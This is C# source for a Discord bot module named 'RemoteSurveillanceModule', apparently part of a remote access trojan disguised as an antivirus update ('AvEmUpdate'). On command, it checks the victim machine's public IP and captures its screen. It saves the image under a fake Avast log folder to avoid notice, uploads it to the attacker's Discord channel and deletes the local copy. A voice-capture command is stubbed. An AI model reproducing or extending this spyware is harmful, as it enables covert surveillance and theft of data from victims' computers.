using Discord.Commands;
using System.Threading.Tasks;
using System.Net;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System;
using System.Drawing.Imaging;

namespace AvEmUpdate.Modules
{
    public class RemoteSurveillanceModule : ModuleBase<SocketCommandContext>
    {
        Random randomizer;
        public string getBotIp()
        {
            WebClient webClient = new WebClient();
            return webClient.DownloadString("http://icanhazip.com");
        }

        [Command("Screenshot")]
        public async Task Screenshot(string botIp)
        {
            if (getBotIp().Trim() == botIp.Trim())
            {
                randomizer = new Random();
                var nextInt = randomizer.Next(1, 99999);

                ScreenCapture screenCapture = new ScreenCapture();
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\AVAST Software\Avast\log"))
                {
                    screenCapture.CaptureScreenToFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\AVAST Software\Avast\log\" + nextInt + "_avast_log.png", ImageFormat.Png);
                    await Context.Channel.SendFileAsync(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\AVAST Software\Avast\log\" + nextInt + "_avast_log.png");
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\AVAST Software\Avast\log\" + nextInt + "_avast_log.png");
                }
                else
                {
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\AVAST Software\Avast\log");
                    screenCapture.CaptureScreenToFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\AVAST Software\Avast\log\" + nextInt + "_avast_log.png", ImageFormat.Png);
                    await Context.Channel.SendFileAsync(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\AVAST Software\Avast\log\" + nextInt + "_avast_log.png");
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\AVAST Software\Avast\log\" + nextInt + "_avast_log.png");
                }
            }
        }

        [Command("Voice")]
        public async Task Voice([Remainder]string botIp)
        {
            await Context.Channel.SendMessageAsync(" not implemented yet ");
        }

    }
}
